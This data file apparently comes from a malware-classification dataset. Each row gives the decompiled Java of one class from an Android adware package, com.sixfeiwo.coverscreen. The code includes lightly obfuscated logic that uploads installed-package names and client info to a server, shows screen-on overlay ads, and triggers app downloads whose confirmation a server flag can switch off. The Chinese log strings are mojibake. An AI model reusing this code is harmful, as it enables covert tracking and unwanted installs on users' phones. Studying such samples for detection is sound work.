"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\ao.code","public final class ao {   public static boolean a(  String str){     return str == null || str.trim().length() == 0 || str.equals(""null"");   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\B.code","public final class B extends C0021t implements GestureDetector.OnGestureListener {   GestureDetector c;   ViewFlipper d;   int e;   private int f;   private int g;   private int h;   private int i;   private int j;   private int k;   private int l;   private int m;   private int n;   private int o;   private int p;   private int q;   private int r;   private int s;   private LinearLayout t;   public B(  SA sa,  List list,  int i){     super(sa,list);     this.f=1;     this.g=32;     this.h=this.g / 2;     this.i=275;     this.j=180;     this.k=5;     this.l=50;     this.m=50;     this.n=14;     this.o=96;     this.p=36;     this.q=this.i + this.g + (this.f << 1);     this.r=this.j + this.g + (this.f << 1)+ this.k+ this.m;     this.s=12;     this.e=0;     this.e=i;     this.c=new GestureDetector(sa,this);     b();   }   @Override public final int a(  View view,  Q q){     this.d.removeView(view);     this.e=super.a(view,q);     return this.e;   }   @Override protected final void c(){     this.f=al.a(getContext(),this.f);     this.g=al.a(getContext(),this.g);     this.q=al.a(getContext(),this.q);     this.r=al.a(getContext(),this.r);     this.h=al.a(getContext(),this.h);     this.i=al.a(getContext(),this.i);     this.j=al.a(getContext(),this.j);     this.k=al.a(getContext(),this.k);     this.l=al.a(getContext(),this.l);     this.m=al.a(getContext(),this.m);     this.p=al.a(getContext(),this.p);     this.o=al.a(getContext(),this.o);     this.s=al.a(getContext(),this.s);     Rect rect=new Rect();     this.f304a.getWindow().getDecorView().getWindowVisibleDisplayFrame(rect);     new StringBuilder().append(""initParam: [imageWidth: "").append(this.i).append("",imageHeight: "").append(this.j).append("",outContainerWidth: "").append(this.q).append("",outContainerHeight: "").append(this.r).append(""]"").append(rect);     int width=rect.width() - this.q;     new StringBuilder().append(""extraWidth: "").append(width).append("",frame.width: "").append(rect.width()).append("",outContainerWidth: "").append(this.q);     if (width < 0 || Math.abs(width) > 10) {       double height=(rect.height() - 10) / this.r;       double width2=(rect.width() - 10) / this.q;       if (height <= width2) {         width2=height;       }       double d=width2 <= 1.5d ? width2 : 1.5d;       this.f=(int)(this.f * d);       this.g=(int)(this.g * d);       this.q=(int)(this.q * d);       this.r=(int)(this.r * d);       this.h=(int)(this.h * d);       this.i=(int)(this.i * d);       this.j=(int)(this.j * d);       this.k=(int)(this.k * d);       this.l=(int)(this.l * d);       this.m=(int)(this.m * d);       this.p=(int)(this.p * d);       this.o=(int)(this.o * d);       this.n=(int)(this.n * d);       this.s=(int)(this.s * d);       new StringBuilder().append(""initParam: [rate: "").append(d).append("",imageWidth: "").append(this.i).append("",imageHeight: "").append(this.j).append("",outContainerWidth: "").append(this.q).append("",outContainerHeight: "").append(this.r).append(""]"");     }   }   @Override protected final void d(){     float a2=al.a(getContext(),5.0f);     ShapeDrawable shapeDrawable=new ShapeDrawable(new RoundRectShape(new float[]{a2,a2,a2,a2,a2,a2,a2,a2},null,null));     shapeDrawable.setPadding(this.f,this.f,this.f,this.f);     shapeDrawable.getPaint().setColor(-1);     RelativeLayout relativeLayout=new RelativeLayout(getContext());     relativeLayout.setLayoutParams(new LinearLayout.LayoutParams(this.q,this.r));     addView(relativeLayout);     LinearLayout linearLayout=new LinearLayout(getContext());     RelativeLayout.LayoutParams layoutParams=new RelativeLayout.LayoutParams(-2,-2);     layoutParams.setMargins(this.h,this.h,this.h,this.h);     layoutParams.addRule(13,-1);     linearLayout.setLayoutParams(layoutParams);     linearLayout.setBackgroundDrawable(shapeDrawable);     linearLayout.setOrientation(1);     linearLayout.setGravity(17);     relativeLayout.addView(linearLayout);     ImageView imageView=new ImageView(getContext());     RelativeLayout.LayoutParams layoutParams2=new RelativeLayout.LayoutParams(-2,-2);     layoutParams2.addRule(10,-1);     layoutParams2.addRule(11,-1);     int i=this.g;     layoutParams2.width=i;     layoutParams2.height=i;     imageView.setLayoutParams(layoutParams2);     imageView.setScaleType(ImageView.ScaleType.FIT_XY);     getContext();     imageView.setImageDrawable(al.a(S.f));     relativeLayout.addView(imageView);     imageView.setOnClickListener(new ViewOnClickListenerC0022u(this));     this.d=new ViewFlipper(getContext());     this.d.setLayoutParams(new LinearLayout.LayoutParams(-2,-2));     for (    Q q : this.b) {       LinearLayout linearLayout2=new LinearLayout(getContext());       linearLayout2.setLayoutParams(new LinearLayout.LayoutParams(-2,-2));       linearLayout2.setOrientation(1);       C0011j c0011j=new C0011j(getContext());       c0011j.setLayoutParams(new LinearLayout.LayoutParams(this.i,this.j));       c0011j.setScaleType(ImageView.ScaleType.FIT_XY);       c0011j.a(8.0f);       a(c0011j,q.b(),false);       linearLayout2.addView(c0011j);       LinearLayout linearLayout3=new LinearLayout(getContext());       LinearLayout.LayoutParams layoutParams3=new LinearLayout.LayoutParams(-1,-2);       layoutParams3.topMargin=this.k;       linearLayout3.setLayoutParams(layoutParams3);       linearLayout3.setOrientation(0);       linearLayout2.addView(linearLayout3);       ImageView imageView2=new ImageView(getContext());       imageView2.setLayoutParams(new LinearLayout.LayoutParams(this.l,this.m));       imageView2.setScaleType(ImageView.ScaleType.FIT_XY);       a(imageView2,q.j(),false);       linearLayout3.addView(imageView2);       LinearLayout linearLayout4=new LinearLayout(getContext());       LinearLayout.LayoutParams layoutParams4=new LinearLayout.LayoutParams(0,-1);       layoutParams4.leftMargin=al.a(getContext(),4.0f);       layoutParams4.weight=1.0f;       linearLayout4.setLayoutParams(layoutParams4);       linearLayout4.setGravity(16);       linearLayout4.setOrientation(1);       linearLayout3.addView(linearLayout4);       TextView textView=new TextView(getContext());       LinearLayout.LayoutParams layoutParams5=new LinearLayout.LayoutParams(-2,-2);       if (Q.f268a.equals(q.h())) {         textView.setText(q.d());       }  else {         textView.setText(q.c());       }       textView.setTextColor(ViewCompat.MEASURED_STATE_MASK);       textView.setTextSize(this.n);       textView.setTypeface(Typeface.DEFAULT_BOLD);       textView.setLayoutParams(layoutParams5);       linearLayout4.addView(textView);       if (Q.f268a.equals(q.h())) {         TextView textView2=new TextView(getContext());         LinearLayout.LayoutParams layoutParams6=new LinearLayout.LayoutParams(-2,-2);         layoutParams6.topMargin=al.a(getContext(),2.0f);         textView2.setText(q.l());         textView2.setTextColor(ViewCompat.MEASURED_STATE_MASK);         textView2.setTextSize(this.n - 2);         textView2.setLayoutParams(layoutParams6);         linearLayout4.addView(textView2);       }       ImageView imageView3=new ImageView(getContext());       LinearLayout.LayoutParams layoutParams7=new LinearLayout.LayoutParams(this.o,this.p);       layoutParams7.gravity=16;       imageView3.setLayoutParams(layoutParams7);       imageView3.setScaleType(ImageView.ScaleType.FIT_XY);       if (Q.f268a.equals(q.h())) {         getContext();         imageView3.setImageDrawable(al.a(S.g));       }  else {         getContext();         imageView3.setImageDrawable(al.a(S.h));       }       linearLayout3.addView(imageView3);       this.d.addView(linearLayout2);     }     linearLayout.addView(this.d);     this.t=new LinearLayout(getContext());     RelativeLayout.LayoutParams layoutParams8=new RelativeLayout.LayoutParams(-1,-2);     layoutParams8.addRule(12,-1);     layoutParams8.addRule(14,-1);     layoutParams8.bottomMargin=this.g;     this.t.setVisibility(8);     this.t.setLayoutParams(layoutParams8);     this.t.setGravity(1);     relativeLayout.addView(this.t);     if (this.e < 0 || this.e >= this.b.size()) {       this.e=0;     }     this.d.setDisplayedChild(this.e);     if (CPManager.getInstance() != null) {       CPManager.getInstance().a(this.e + 1);     }     a(this.e);     C c=new C(this,linearLayout);     Animation scaleAnimation=new ScaleAnimation(0.0f,1.0f,0.0f,1.0f,1,0.5f,1,0.5f);     scaleAnimation.setDuration(1000L);     scaleAnimation.setAnimationListener(new AnimationAnimationListenerC0026y(this,c,relativeLayout));     relativeLayout.startAnimation(scaleAnimation);   }   @Override public final void f(){     TranslateAnimation translateAnimation=new TranslateAnimation(1,1.0f,1,0.0f,1,0.0f,1,0.0f);     translateAnimation.setDuration(500L);     TranslateAnimation translateAnimation2=new TranslateAnimation(1,0.0f,1,-1.0f,1,0.0f,1,0.0f);     translateAnimation2.setDuration(500L);     this.d.setInAnimation(translateAnimation);     this.d.setOutAnimation(translateAnimation2);     this.d.showNext();     this.e++;     if (this.e >= this.b.size()) {       this.e=0;     }     if (CPManager.getInstance() != null) {       CPManager.getInstance().a(this.e + 1);     }     a(this.e);   }   @Override public final boolean onDown(  MotionEvent motionEvent){     g();     return false;   }   @Override public final boolean onFling(  MotionEvent motionEvent,  MotionEvent motionEvent2,  float f,  float f2){     if (this.b.size() <= 1) {       return true;     }     if (motionEvent2.getX() - motionEvent.getX() > 120.0f) {       TranslateAnimation translateAnimation=new TranslateAnimation(1,-1.0f,1,0.0f,1,0.0f,1,0.0f);       translateAnimation.setDuration(500L);       TranslateAnimation translateAnimation2=new TranslateAnimation(1,0.0f,1,1.0f,1,0.0f,1,0.0f);       translateAnimation2.setDuration(500L);       this.d.setInAnimation(translateAnimation);       this.d.setOutAnimation(translateAnimation2);       this.d.showPrevious();       this.e--;       if (this.e < 0) {         this.e=this.b.size() - 1;       }       if (CPManager.getInstance() != null) {         CPManager.getInstance().a(this.e + 1);       }       a(this.e);     }  else     if (motionEvent2.getX() - motionEvent.getX() < -120.0f) {       f();     }     g();     return true;   }   @Override public final void onLongPress(  MotionEvent motionEvent){     g();   }   @Override public final boolean onScroll(  MotionEvent motionEvent,  MotionEvent motionEvent2,  float f,  float f2){     g();     return false;   }   @Override public final void onShowPress(  MotionEvent motionEvent){     g();   }   @Override public final boolean onSingleTapUp(  MotionEvent motionEvent){     g();     if (this.e >= this.b.size()) {       f();     }  else {       b(this.d.getChildAt(this.e),(Q)this.b.get(this.e));     }     return true;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\C.code","public final class C implements Animation.AnimationListener {   final B f255a;   private LinearLayout b;   public C(  B b,  LinearLayout linearLayout){     this.f255a=b;     this.b=linearLayout;   }   @Override public final void onAnimationEnd(  Animation animation){     this.b.setOnTouchListener(new D(this));     this.f255a.setOnClickListener(new E(this));   }   @Override public final void onAnimationRepeat(  Animation animation){   }   @Override public final void onAnimationStart(  Animation animation){   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\C0003b.code","public final class C0003b extends Thread {   private AbstractC0002a f288a;   public C0003b(  AbstractC0002a abstractC0002a){     this.f288a=abstractC0002a;   }   @Override public final void run(){     Context e=this.f288a.e();     String replace=""coverscreen_sixfw"".replace(""_sixfw"","""");     try {       if (!e.getSharedPreferences(replace,0).getBoolean(""isFirstRun_sixfw"".replace(""_sixfw"",""""),true)) {         AbstractC0002a.b(this.f288a);       }  else {         try {           Thread.sleep(60000L);         }  catch (        InterruptedException e2) {         }         AbstractC0002a.a(this.f288a);       }     }  catch (    Exception e3) {     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\C0004c.code","public final class C0004c extends TimerTask {   private AbstractC0002a f289a;   public C0004c(  AbstractC0002a abstractC0002a){     this.f289a=abstractC0002a;   }   @Override public final void run(){     this.f289a.b();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\C0005d.code","public final class C0005d implements aa {   private AbstractC0002a f290a;   public C0005d(  AbstractC0002a abstractC0002a){     this.f290a=abstractC0002a;   }   @Override public final void a(  boolean z,  String str){     Context context;     new StringBuilder().append(""æœ�åŠ¡å™¨è¿”å›žï¼ˆuploadClientInfoï¼‰ï¼š"").append(str);     context=this.f290a.d;     an.a(context,""coverscreen_sixfw"".replace(""_sixfw"",""""),""isFirstRun_sixfw"".replace(""_sixfw"",""""),false);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\C0006e.code","public final class C0006e implements aa {   private AbstractC0002a f291a;   public C0006e(  AbstractC0002a abstractC0002a){     this.f291a=abstractC0002a;   }   @Override public final void a(  boolean z,  String str){     Context context;     new StringBuilder().append(""æœ�åŠ¡å™¨è¿”å›žï¼ˆsendAppInstallï¼‰ï¼š"").append(str);     if (z) {       context=this.f291a.d;       an.b(context,S.j,""packnames_sixfw"".replace(""_sixfw"",""""),(String)null);     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\C0010i.code","final class C0010i implements aa {   private CPManager f295a;   public C0010i(  CPManager cPManager){     this.f295a=cPManager;   }   @Override public final void a(  boolean z,  String str){     List b;     List list;     List list2;     List list3;     this.f295a.e();     new StringBuilder().append(""èŽ·å�–å¹¿å‘Šçš„ç½‘ç»œè¯·æ±‚å¾—åˆ°è¿”å›žç»“æžœï¼š"").append(str);     if (z) {       try {         JSONObject jSONObject=new JSONObject(str);         int optInt=jSONObject.optInt(""errorcode_sixfw"".replace(""_sixfw"",""""),1);         String optString=jSONObject.optString(""errormessage_sixfw"".replace(""_sixfw"",""""));         if (optInt != 0) {           this.f295a.e();           new StringBuilder().append(""request failed: "").append(optString);         }  else {           int optInt2=jSONObject.optInt(""screenOnNum_sixfw"".replace(""_sixfw"",""""),-1);           int optInt3=jSONObject.optInt(""screenOnShowRate_sixfw"".replace(""_sixfw"",""""),-1);           jSONObject.optInt(""coverScreenRefreshTime_sixfw"".replace(""_sixfw"",""""),60);           int optInt4=optInt2 == -1 ? jSONObject.optInt(""screenNoNum_sixfw"".replace(""_sixfw"",""""),3) : optInt2;           int optInt5=optInt3 == -1 ? jSONObject.optInt(""screenNoShowRate_sixfw"".replace(""_sixfw"",""""),10) : optInt3;           int optInt6=jSONObject.optInt(""screenOnSwitchDelay_sixfw"".replace(""_sixfw"",""""),10);           boolean optBoolean=jSONObject.optBoolean(""screenOnShow_sixfw"".replace(""_sixfw"",""""),true);           boolean optBoolean2=jSONObject.optBoolean(""coverDownloadConfirm_sixfw"".replace(""_sixfw"",""""),false);           JSONArray optJSONArray=jSONObject.optJSONArray(""ads_placeholder"".replace(""_placeholder"",""""));           int i=optInt6 > 0 ? optInt6 : 10;           if (optJSONArray != null) {             this.f295a.a(optJSONArray);           }           CPManager.a(this.f295a,0);           CPManager cPManager=this.f295a;           CPManager cPManager2=this.f295a;           b=CPManager.b(optJSONArray);           cPManager.c=b;           this.f295a.d=new Date(new Date().getTime() + 60000);           an.b(this.f295a.e(),S.j,S.p,optInt4);           an.b(this.f295a.e(),S.j,S.n,optInt5);           an.b(this.f295a.e(),S.j,S.o,i * 1000);           an.a(this.f295a.e(),S.j,S.l,optBoolean);           an.a(this.f295a.e(),S.j,S.i,optBoolean2);           new StringBuilder().append(""setContent, screenOnNum: "").append(optInt4).append("", screenOnShowRate: "").append(optInt5).append("", screenOnSwitchDelay: "").append(i * 1000).append("", enableScreenOnShow: "").append(optBoolean).append("", downloadConfirm: "").append(optBoolean2).append("", coverScreenRefreshTime: "").append(1);         }       }  catch (      JSONException e) {         this.f295a.e();         new StringBuilder().append(""error result: "").append(e);       }     }     list=this.f295a.c;     if (list != null) {       list2=this.f295a.c;       if (!list2.isEmpty()) {         String replace=""C_sixfw"".replace(""_sixfw"","""");         StringBuilder append=new StringBuilder().append(""size: _sixfw"".replace(""_sixfw"",""""));         list3=this.f295a.c;         Log.i(replace,append.append(list3.size()).toString());         this.f295a.c();         this.f295a.e();         this.f295a.a(false);       }     }     Log.i(""C_sixfw"".replace(""_sixfw"",""""),""size: 0_sixfw"".replace(""_sixfw"",""""));     this.f295a.c();     this.f295a.e();     this.f295a.a(false);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\C0011j.code","public final class C0011j extends ImageView {   private final RectF f296a;   private float b;   private final Paint c;   private final Paint d;   public C0011j(  Context context){     super(context);     this.f296a=new RectF();     this.b=6.0f;     this.c=new Paint();     this.d=new Paint();     a();   }   private void a(){     this.c.setAntiAlias(true);     this.c.setXfermode(new PorterDuffXfermode(PorterDuff.Mode.SRC_IN));     this.d.setAntiAlias(true);     this.d.setColor(-1);     this.b=getResources().getDisplayMetrics().density * this.b;   }   public final void a(  float f){     this.b=8.0f;     invalidate();   }   @Override public final void draw(  Canvas canvas){     canvas.saveLayer(this.f296a,this.d,31);     canvas.drawRoundRect(this.f296a,this.b,this.b,this.d);     canvas.saveLayer(this.f296a,this.c,31);     super.draw(canvas);     canvas.restore();   }   @Override protected final void onLayout(  boolean z,  int i,  int i2,  int i3,  int i4){     super.onLayout(z,i,i2,i3,i4);     this.f296a.set(0.0f,0.0f,getWidth(),getHeight());   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\C0012k.code","final class C0012k extends BroadcastReceiver {   private SA f297a;   public C0012k(  SA sa){     this.f297a=sa;   }   @Override public final void onReceive(  Context context,  Intent intent){     this.f297a.finish();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\C0015n.code","public final class C0015n extends T {   final SA f300a;   private Q b;   public C0015n(  SA sa,  Q q){     this.f300a=sa;     this.b=q;   }   @Override public final void a(  H h,  String str,  boolean z){     super.a(h,str,z);     if (""true_sixfw"".replace(""_sixfw"","""").equals(this.b.o()) && z) {       this.f300a.f270a.post(new RunnableC0016o(this,str,h));     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\C0017p.code","public final class C0017p implements aa {   public C0017p(  SA sa){   }   @Override public final void a(  boolean z,  String str){     new StringBuilder().append(""æœ�åŠ¡å™¨è¿”å›žï¼ˆsendClickRequestï¼‰ï¼š"").append(str);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\C0018q.code","public final class C0018q implements aa {   public C0018q(  SA sa){   }   @Override public final void a(  boolean z,  String str){     new StringBuilder().append(""æœ�åŠ¡å™¨è¿”å›žï¼ˆsendShowRequestï¼‰ï¼š"").append(str);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\C0019r.code","final class C0019r extends Thread {   private Intent f302a;   private Context b;   private SR c;   public C0019r(  SR sr,  Intent intent,  Context context){     this.c=sr;     this.f302a=intent;     this.b=context;   }   @Override public final void run(){     String substring=this.f302a.getDataString().substring(8);     try {       SR.a(this.c,this.b,substring);       if (CPManager.getInstance() != null) {         CPManager.getInstance().a(substring);       }     }  catch (    Exception e) {       new StringBuilder().append(""ä¸Šä¼ åŒ…å®‰è£…ä¿¡æ�¯å¤±è´¥ï¼š"").append(e);     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\C0020s.code","public final class C0020s implements aa {   private Context f303a;   private String b;   public C0020s(  SR sr,  Context context,  String str){     this.f303a=context;     this.b=str;   }   @Override public final void a(  boolean z,  String str){     new StringBuilder().append(""æœ�åŠ¡å™¨è¿”å›žï¼ˆsendAppInstall from ScreenReceiverï¼‰ï¼š"").append(str);     if (z) {       return;     }     new StringBuilder().append(""ä¸Šä¼ å®‰è£…ä¿¡æ�¯å¤±è´¥ï¼š"").append(str);     String a2=an.a(this.f303a,S.j,""packnames_sixfw"".replace(""_sixfw"",""""),(String)null);     if (a2 != null) {       new StringBuilder().append(a2).append("","").append(this.b);     }  else {       String str2=this.b;     }     an.b(this.f303a,S.j,""packnames_sixfw"".replace(""_sixfw"",""""),this.b);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\C0021t.code","public class C0021t extends LinearLayout {   SA f304a;   List b;   private Timer c;   private TimerTask d;   private int e;   public C0021t(  SA sa,  List list){     super(sa);     new Handler();     setLayoutParams(new ViewGroup.LayoutParams(-1,-1));     setGravity(17);     this.f304a=sa;     this.b=list;     this.e=an.a(sa,S.j,S.o,5);   }   private void c(  View view,  Q q){     AlertDialog.Builder builder=new AlertDialog.Builder(getContext());     builder.setCancelable(false);     builder.setTitle(""æ��ç¤º_sixfw"".replace(""_sixfw"",""""));     builder.setMessage(""ç¡®å®šä¸‹è½½ _sixfw"".replace(""_sixfw"","""") + q.d() + "" ï¼Ÿ"");     builder.setPositiveButton(""ç¡®å®š_sixfw"".replace(""_sixfw"",""""),new DialogInterfaceOnClickListenerC0023v(this,view,q));     builder.setNegativeButton(""å�–æ¶ˆ_sixfw"".replace(""_sixfw"",""""),new DialogInterfaceOnClickListenerC0024w(this));     builder.show();     i();   }   public int a(  View view,  Q q){     int indexOf=this.b.indexOf(q);     this.b.remove(q);     if (indexOf < 0) {       return 0;     }     if (indexOf >= this.b.size()) {       a(indexOf - 1);       return indexOf - 1;     }     a(indexOf);     return indexOf;   }   public final List a(){     return this.b;   }   public final void a(  int i){     if (this.b.isEmpty()) {       return;     }     this.f304a.b((Q)this.b.get(i));   }   public final void a(  ImageView imageView,  String str,  boolean z){     imageView.setTag(str);     ah.a().a(getContext(),str,new C0025x(this,imageView,str,false));   }   public final void b(){     c();     d();     h();   }   public final void b(  View view,  Q q){     int b=P.b(getContext());     if (Q.f268a.equals(q.h())) {       if (b == 4) {         if (""false_sixfw"".replace(""_sixfw"","""").equals(q.n())) {           c(view,q);           return;         }       }  else       if (""false_sixfw"".replace(""_sixfw"","""").equals(q.p())) {         c(view,q);         return;       }     }     a(view,q);     this.f304a.a(q);   }   protected void c(){   }   protected void d(){   }   public final void e(){     this.f304a.finish();   }   public void f(){   }   public final void g(){     i();     h();   }   public final void h(){     i();     if (this.b == null || this.b.isEmpty()) {       return;     }     if (this.c == null) {       this.c=new Timer();     }     this.d=new C0027z(this);     this.c.schedule(this.d,this.e,this.e);   }   public final void i(){     if (this.d != null) {       this.d.cancel();       this.d=null;     }     if (this.c != null) {       this.c.cancel();       this.c=null;     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\C0025x.code","public final class C0025x implements ak {   private ImageView f308a;   private String b;   private boolean c;   private C0021t d;   public C0025x(  C0021t c0021t,  ImageView imageView,  String str,  boolean z){     this.d=c0021t;     this.f308a=imageView;     this.b=str;     this.c=z;   }   @Override public final void a(  Drawable drawable){     Bitmap createBitmap;     if (drawable == null || this.f308a.getTag() == null || !this.f308a.getTag().equals(this.b)) {       return;     }     if (!this.c) {       this.f308a.setImageDrawable(drawable);       return;     }     ImageView imageView=this.f308a;     Bitmap copy=((BitmapDrawable)drawable).getBitmap().copy(Bitmap.Config.ARGB_8888,false);     float a2=al.a(this.d.getContext(),8.0f);     if (copy == null) {       createBitmap=null;     }  else {       createBitmap=Bitmap.createBitmap(copy.getWidth(),copy.getHeight(),Bitmap.Config.ARGB_8888);       Canvas canvas=new Canvas(createBitmap);       Paint paint=new Paint();       Rect rect=new Rect(0,0,copy.getWidth(),copy.getHeight());       RectF rectF=new RectF(rect);       paint.setAntiAlias(true);       canvas.drawARGB(0,0,0,0);       paint.setColor(-12434878);       canvas.drawRoundRect(rectF,a2,a2,paint);       paint.setXfermode(new PorterDuffXfermode(PorterDuff.Mode.SRC_IN));       canvas.drawBitmap(copy,rect,rect,paint);       copy.recycle();     }     imageView.setImageBitmap(createBitmap);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\C0027z.code","public final class C0027z extends TimerTask {   final C0021t f310a;   public C0027z(  C0021t c0021t){     this.f310a=c0021t;   }   @Override public final void run(){     this.f310a.f304a.runOnUiThread(new A(this));   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\CPManager.code","public final class CPManager extends AbstractC0002a {   private static CPManager i;   private List c;   private Date d;   private int e;   private boolean f;   private long g;   private long h;   private CPManager(  Context context,  String str){     super(context,str);     this.d=null;     this.e=0;     this.f=false;   }   private int a(  Context context){     if (context == null || !P.a(context)) {       this.g=new Date().getTime();       this.f=true;       return 2;     }     if (this.h > 0 && System.currentTimeMillis() - this.h < 5000) {       return 6;     }     if (this.c == null || this.c.isEmpty()) {       this.g=new Date().getTime();       this.f=true;       a(true);       return 2;     }     if (this.e >= this.c.size()) {       this.e=0;     }     this.h=System.currentTimeMillis();     if (!a(this.c,this.e)) {       return 4;     }     a(true);     return 0;   }   public static int a(  CPManager cPManager,  int i2){     cPManager.e=0;     return 0;   }   public static List b(  JSONArray jSONArray){     if (jSONArray == null) {       return null;     }     ArrayList arrayList=new ArrayList();     for (int i2=0; i2 < jSONArray.length(); i2++) {       try {         Q a2=Q.a(jSONArray.getJSONObject(i2));         if (a2 != null && a2.a() > 0) {           arrayList.add(a2);         }       }  catch (      Exception e) {         return null;       }     }     return arrayList;   }   public static void close(  Context context){     context.sendBroadcast(new Intent(S.q));   }   public static void destory(  Context context){     if (i == null || context == null) {       return;     }     close(context);     i.a();   }   public static CPManager getInstance(){     return i;   }   public static CPManager init(  Context context,  String str){     if (i != null) {       return i;     }     if (context == null) {       throw new IllegalArgumentException(""context is null_sixfw"".replace(""_sixfw"",""""));     }     if (str == null || str.trim().length() < 8) {       throw new IllegalArgumentException(""appkey is error_sixfw"".replace(""_sixfw"",""""));     }     CPManager cPManager=new CPManager(context,str);     i=cPManager;     return cPManager;   }   public static void setShowAtScreenOn(  boolean z){     if (i != null) {       f278a=z;       an.a(i.e(),S.j,S.m,z);     }   }   public static int showAd(  Context context){     if (i == null) {       return 1;     }     try {       return i.a(context);     }  catch (    Exception e) {       return 5;     }   }   @Override public final void a(){     super.a();     i=null;   }   public final void a(  int i2){     this.e=i2;   }   public final void a(  String str){     if (ao.a(str) || this.c == null) {       return;     }     Iterator it=this.c.iterator();     while (it.hasNext()) {       if (str.equals(((Q)it.next()).e())) {         it.remove();       }     }   }   @Override public final void b(){     if (this.b) {       e();       return;     }     if (this.d != null && this.d.getTime() > new Date().getTime() && this.c != null && this.c.size() > 0) {       e();       return;     }     this.b=true;     JSONObject a2=H.a(e(),S.f269a);     ab abVar=new ab();     abVar.a(e(),I.e(),d(),a2.toString());     abVar.a(new C0010i(this));     e();     Z.a().a(abVar);   }   @Override public final void c(){     super.c();     if (this.c == null || this.c.isEmpty() || !this.f) {       return;     }     this.f=false;     if (new Date().getTime() - this.g <= 10000) {       a(e());     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\D.code","final class D implements View.OnTouchListener {   private C f256a;   public D(  C c){     this.f256a=c;   }   @Override public final boolean onTouch(  View view,  MotionEvent motionEvent){     this.f256a.f255a.c.onTouchEvent(motionEvent);     return true;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\DialogInterfaceOnClickListenerC0023v.code","public final class DialogInterfaceOnClickListenerC0023v implements DialogInterface.OnClickListener {   private View f306a;   private Q b;   private C0021t c;   public DialogInterfaceOnClickListenerC0023v(  C0021t c0021t,  View view,  Q q){     this.c=c0021t;     this.f306a=view;     this.b=q;   }   @Override public final void onClick(  DialogInterface dialogInterface,  int i){     this.c.a(this.f306a,this.b);     this.c.f304a.a(this.b);     this.c.h();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\DialogInterfaceOnClickListenerC0024w.code","public final class DialogInterfaceOnClickListenerC0024w implements DialogInterface.OnClickListener {   private C0021t f307a;   public DialogInterfaceOnClickListenerC0024w(  C0021t c0021t){     this.f307a=c0021t;   }   @Override public final void onClick(  DialogInterface dialogInterface,  int i){     this.f307a.h();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\E.code","final class E implements View.OnClickListener {   private C f257a;   public E(  C c){     this.f257a=c;   }   @Override public final void onClick(  View view){     if (this.f257a.f255a.e >= this.f257a.f255a.a().size()) {       this.f257a.f255a.f();       return;     }     Q q=(Q)this.f257a.f255a.a().get(this.f257a.f255a.e);     if (""true"".equals(q.q())) {       this.f257a.f255a.b(this.f257a.f255a.d.getChildAt(this.f257a.f255a.e),q);     }   } } "
